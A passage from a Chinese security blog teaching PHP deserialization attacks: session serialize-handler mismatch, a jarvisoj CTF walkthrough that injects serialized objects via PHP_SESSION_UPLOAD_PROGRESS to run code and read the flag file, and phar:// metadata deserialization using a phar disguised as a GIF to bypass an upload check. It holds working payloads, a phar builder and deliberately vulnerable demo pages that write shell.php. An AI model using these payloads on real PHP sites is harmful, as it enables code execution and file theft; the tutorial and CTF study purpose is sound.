<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;&quot;   --设置session的存储路径,默认在/tmp</span><br><span class="line">session.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="line">session.serialize_handler   --定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure>

<p>一个简单的demo(session.php)认识一下存储过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;hpdoger&apos;] = $_GET[&apos;hpdoger&apos;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>访问页面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test/session.php?hpdoger=lover</span><br></pre></td></tr></table></figure>

<p>在session.save_path对应路径下会生成一个文件，名称例如:sess_1ja9n59ssk975tff3r0b2sojd5<br>因为选择的序列化处理方式为php_serialize,所以是被serialize()函数处理过的$_SESSION[‘hpdoger’]。存储文件内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;hpdoger&quot;;s:5:&quot;lover&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>如果选择的序列化处理方式为php，即<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);</code>,则存储内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hpdoger|s:5:&quot;lover&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞剖析-1"><a href="#漏洞剖析-1" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。</p>
<p>这里提供一个demo：</p>
<p>存储Session页面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*session.php*/</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;hpdoger&apos;] = $_GET[&apos;hpdoger&apos;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可利用页面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/*test.php*/</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class hpdoger&#123;</span><br><span class="line">	var $a;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		$fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);</span><br><span class="line">		fputs($fp,$this-&gt;a);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>访问第一个页面的poc:<br><img src="https://i.loli.net/2018/09/06/5b90f6078e2c6.png" alt></p>
<p>/tmp目录下生成的session文件内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;hpdoger&quot;;s:52:&quot;|O:7:&quot;hpdoger&quot;:1:&#123;s:1:&quot;a&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>再访问test.php时反序列化已存储的session，新的php处理方式会把“|”后的值当作KEY值再serialize()，相当于我们实例化了这个页面的hpdoger类，相当于执行:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;hpdoger&apos;] = new hpdoger();</span><br><span class="line">$_SESSION[&apos;hpdoger&apos;]-&gt;a = &apos;&lt;?php phpinfo()?&gt;&apos;;</span><br></pre></td></tr></table></figure>

<p>在指定的目录D:\phpStudy\PHPTutorial\WWW\test\shell.php中会写入内容<code>&lt;?php phpinfo()?&gt;</code><br><img src="https://i.loli.net/2018/09/06/5b90f607d6b3a.jpg" alt></p>
<h3 id="jarvisoj-web的一道SESSION反序列化"><a href="#jarvisoj-web的一道SESSION反序列化" class="headerlink" title="jarvisoj-web的一道SESSION反序列化"></a>jarvisoj-web的一道SESSION反序列化</h3><p>题目入口(<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a>)<br>Index页给源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&apos;index.php&apos;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看到ini_set(‘session.serialize_handler’, ‘php’);</p>
<p>暂时没找到用php_serialize添加session的方法。但看到当get传入phpinfo时会实例化OowoO这个类并访问phpinfo()<br><img src="https://i.loli.net/2018/09/07/5b927fb850e32.png" alt></p>
<p>这里参考Chybeta师傅的一个姿势：session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。</p>
<p>构造上传的表单poc，列出当前目录:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;|O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;&#125;&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>通过phpinfo页面查看当前路径<code>_SERVER[&quot;SCRIPT_FILENAME&quot;]</code><br><img src="https://i.loli.net/2018/09/07/5b927fb844eb0.png" alt></p>
<p>读文件就行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;4d96e37f4be998c50aa586de4ada354a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="phar伪协议触发php反序列化"><a href="#phar伪协议触发php反序列化" class="headerlink" title="phar伪协议触发php反序列化"></a>phar伪协议触发php反序列化</h2><p>最近Black Hat比较热的一个议题：It’s a PHP unserialization vulnerability Jim, but not as we know it。参考了创宇的文章，这里笔者把它作为php反序列化的最后一个模块，希望日后能在以上的几种反序列化之外拓宽新的思路。</p>
<h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h3><p>可以将多个文件归入一个本地文件夹，也可以包含一个文件</p>
<h3 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h3><p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。</p>
<h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p>详情参考php手册(<a href="https://secure.php.net/phar" target="_blank" rel="noopener">https://secure.php.net/phar</a>)</p>
<p>这里摘出创宇提供的四部分结构概要：<br>1、a stub<br>识别phar拓展的标识，格式:xxx<?php xxx; __HALT_COMPILER();?>。对应的函数Phar::setStub</p>
<p>2、a manifest describing the contents<br>被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata–设置phar归档元数据</p>
<p>3、 the file contents<br>被压缩文件的内容。</p>
<p>4、[optional] a signature for verifying Phar integrity (phar file format only)<br>签名，放在文件末尾。对应函数Phar :: stopBuffering –停止缓冲对Phar存档的写入请求，并将更改保存到磁盘</p>
<h3 id="Phar内置方法"><a href="#Phar内置方法" class="headerlink" title="Phar内置方法"></a>Phar内置方法</h3><p>要想使用Phar类里的方法，必须将phar.readonly配置项配置为0或Off（文档中定义）</p>
<p>PHP内置phar类，其他的一些方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$phar = new Phar(&apos;phar/hpdoger.phar&apos;); //实例一个phar对象供后续操作</span><br><span class="line">$phar-&gt;startBuffering()  //开始缓冲Phar写操作</span><br><span class="line">$phar-&gt;addFromString(&apos;test.php&apos;,&apos;&lt;?php echo \&apos;this is test file\&apos;;&apos;); //以字符串的形式添加一个文件到 phar 档案</span><br><span class="line">$phar-&gt;buildFromDirectory(&apos;fileTophar&apos;) //把一个目录下的文件归档到phar档案</span><br><span class="line">$phar-&gt;extractTo()  //解压一个phar包的函数，extractTo 提取phar文档内容</span><br></pre></td></tr></table></figure>

<h3 id="漏洞剖析-2"><a href="#漏洞剖析-2" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>文件的第二部分a manifest describing the contents可知，phar文件会以序列化的形式存储用户自定义的meta-data，在一些<strong>文件操作函数</strong>执行的参数可控，参数部分我们利用Phar伪协议，可以不依赖unserialize()直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的。</p>
<p>而在一些上传点，我们可以更改phar的文件头并且修改其后缀名绕过检测，如：test.gif，里面的meta-data却是我们提前写入的恶意代码，而且可利用的<strong>文件操作函数</strong>又很多，所以这是一种不错的绕过+执行的方法。</p>
<h3 id="文件上传绕过deomo"><a href="#文件上传绕过deomo" class="headerlink" title="文件上传绕过deomo"></a>文件上传绕过deomo</h3><p>自己写了个丑陋的代码，只允许gif文件上传（实则有其他方法绕过，这里不赘述），代码部分如下</p>
<p><strong>前端上传：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://localhost/test/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;hpdoger&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><strong>后端验证：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/*upload.php*/</span><br><span class="line">&lt;?php</span><br><span class="line">	/*返回后缀名函数*/</span><br><span class="line">	function getExt($filename)&#123;</span><br><span class="line">		return substr($filename,strripos($filename,&apos;.&apos;)+1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*检测MIME类型是否为gif*/</span><br><span class="line">	if($_FILES[&apos;hpdoger&apos;][&apos;type&apos;] != &quot;image/gif&quot;)&#123;</span><br><span class="line">		echo &quot;Not allowed !&quot;;</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		$filenameExt = strtolower(getExt($_FILES[&apos;hpdoger&apos;][&apos;name&apos;]));	/*提取后缀名*/</span><br><span class="line">		</span><br><span class="line">		if($filenameExt != &apos;gif&apos;)&#123;</span><br><span class="line">			echo &quot;Not gif !&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			move_uploaded_file($_FILES[&apos;hpdoger&apos;][&apos;tmp_name&apos;], $_FILES[&apos;hpdoger&apos;][&apos;name&apos;]);</span><br><span class="line">			echo &quot;Successfully！&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码判断了MIME类型+后缀判断，如下是我测试php文件的两个结果：<br>直接上传php<br><img src="https://i.loli.net/2018/09/07/5b9280161ed92.png" alt></p>
<p>抓包更改content-type为 image/gif再次上传<br><img src="https://i.loli.net/2018/09/07/5b9280606915f.png" alt><br><img src="https://i.loli.net/2018/09/07/5b9280606784b.png" alt></p>
<p>可以看到两次都被拒绝上传,那我们更改phar后缀名再次上传</p>
<p>php环境编译生成一个phar文件，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class not_useful&#123;</span><br><span class="line">	var $file = &quot;&lt;?php phpinfo() ?&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;hpdoger.phar&quot;);</span><br><span class="line">$test = new not_useful();</span><br><span class="line">$phar = new Phar(&quot;hpdoger.phar&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($test);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里实例的类是为后面的demo做铺垫，php文件同目录下生成hpdoger.phar文件，我们更改名称为hpdoger.gif看一下<br><img src="https://i.loli.net/2018/09/07/5b92801620631.png" alt></p>
<p>gif头、phar识别序列、序列化后的字符串都具备</p>
<p>上传一下看能否成功,成功绕过检测在服务端存储一个hpdoger.gif<br><img src="https://i.loli.net/2018/09/07/5b92808e8c0bf.png" alt></p>
<h3 id="利用Phar-伪协议demo"><a href="#利用Phar-伪协议demo" class="headerlink" title="利用Phar://伪协议demo"></a>利用Phar://伪协议demo</h3><p>我们已经上传了可解析的phar文件，现在需要找到一个文件操作函数的页面来利用，这里笔者写一个比较鸡肋的页面，目的是还原流程而非真实情况。</p>
<p>代码如下:reapperance.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$recieve = $_GET[&apos;recieve&apos;];</span><br><span class="line">	</span><br><span class="line">	/*写入文件类操作*/</span><br><span class="line">	class not_useful&#123;</span><br><span class="line">		var $file;</span><br><span class="line"></span><br><span class="line">		function __destruct()&#123;</span><br><span class="line">		$fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;); //自定义写入路径</span><br><span class="line">		fputs($fp,$this-&gt;file);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	file_get_contents($recieve);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>$recieve可控，符合我们的利用条件。那我们构造payload:<br><img src="https://i.loli.net/2018/09/07/5b92808e8a8ae.png" alt></p>
<p>若执行成功，会将刚才写入meta-data数据里面序列化的类进行反序列化，并且实例了$file成员，导致文件写入，成功写入如下：<br><img src="https://i.loli.net/2018/09/07/5b92808e93634.png" alt></p>
<h3 id="可利用的文件操作函数"><a href="#可利用的文件操作函数" class="headerlink" title="可利用的文件操作函数"></a>可利用的文件操作函数</h3><p>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</p>
<h3 id="各种文件头"><a href="#各种文件头" class="headerlink" title="各种文件头"></a>各种文件头</h3><table>
<thead>
<tr>
<th>类型</th>
<th>标识</th>
</tr>
</thead>
<tbody><tr>
<td>JPEG</td>
<td>头标识ff d8 ,结束标识ff d9</td>
</tr>
<tr>
<td>PNG</td>
<td>头标识89 50 4E 47 0D 0A 1A 0A</td>
</tr>
<tr>
<td>GIF</td>
<td>头标识(6 bytes) 47 49 46 38 39(37) 61 GIF89(7)a</td>
</tr>
<tr>
<td>BMP</td>
<td>头标识(2 bytes) 42 4D BM</td>
</tr>
</tbody></table>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>jarvisoj-web-writeup(<a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO</a>)<br>利用 phar 拓展 php 反序列化漏洞攻击面(<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a>)</p>

                
            </div>
            <div class="continue">
            <a href="/2018/09/13/四个实例递进php反序列化/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
</section>

  <nav class="page-nav">
    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
  </nav>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>